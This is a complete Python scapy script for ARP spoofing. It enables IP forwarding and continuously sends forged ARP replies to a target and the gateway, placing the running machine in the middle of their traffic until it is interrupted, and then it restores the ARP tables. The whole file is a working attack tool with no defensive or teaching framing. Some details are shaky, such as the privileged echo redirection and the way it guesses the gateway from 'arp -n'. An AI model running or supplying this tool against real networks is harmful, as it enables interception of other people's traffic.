#!/usr/bin/env python3
import subprocess
import scapy.all as scapy
import argparse
import time
import re
import sys


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target_ip",
                        help="Target IP address")

    options = parser.parse_args()
    if not options.target_ip:
        parser.error(
            "Please enter target IP address, use --help for more information")

    return options


def get_mac_address(ip):
    try:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast,
                                  timeout=1, verbose=False)[0]
        return answered_list[0][1].hwsrc
    except IndexError:
        print("[-] Index out of bound exception found")


def restore(source_ip, destination_ip):
    source_mac = get_mac_address(source_ip)
    destination_mac = get_mac_address(destination_ip)
    # reset the the back to router
    packet = scapy.ARP(op=2, pdst=destination_ip,
                       hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    # more than 4 times sent packet to make sure :)
    scapy.send(packet, count=4, verbose=False)


def spoof(target_ip, spoof_ip):
    # source ip & mac will be ours
    packet = scapy.ARP(op=2, pdst=target_ip,
                       hwdst=get_mac_address(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def get_getway_ip():
    arp_result = subprocess.check_output(
        "arp -n | awk '{print $1}'", shell=True).decode("utf-8")
    search_result = re.search(
        r"\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b", arp_result)
    return search_result.group(0) if search_result else None


def get_ipv4_forward_status():
    status = subprocess.check_output(
        ["cat", "/proc/sys/net/ipv4/ip_forward"]).decode("utf-8")
    return status


def set_ipv4_forward_status(state):
    subprocess.call(f"sudo echo {str(state)} > /proc/sys/net/ipv4/ip_forward",shell=True)

def restore_all(target_ip, gateway_ip, prev_state=0):
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    set_ipv4_forward_status(prev_state)
    print("[+] Restoring done!")


if __name__ == "__main__":
    args = get_arguments()
    target_ip = args.target_ip
    gateway_ip = get_getway_ip()
    set_ipv4_forward_status(1)
    if not gateway_ip:
        print("[-] No Gateway IP found.. Are you connected to network?")
        sys.exit("[-] Exiting...")
    packet_counter = 0
    try:
        while True:
            spoof(target_ip, gateway_ip)
            spoof(gateway_ip, target_ip)
            packet_counter = packet_counter + 2
            # \r will make sure the text gets replaced instead of appending it
            print(f"\r[+] Packets sent:{str(packet_counter)}", end="")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Exiting program and restoring IP")
    finally:
        restore_all(target_ip, gateway_ip)
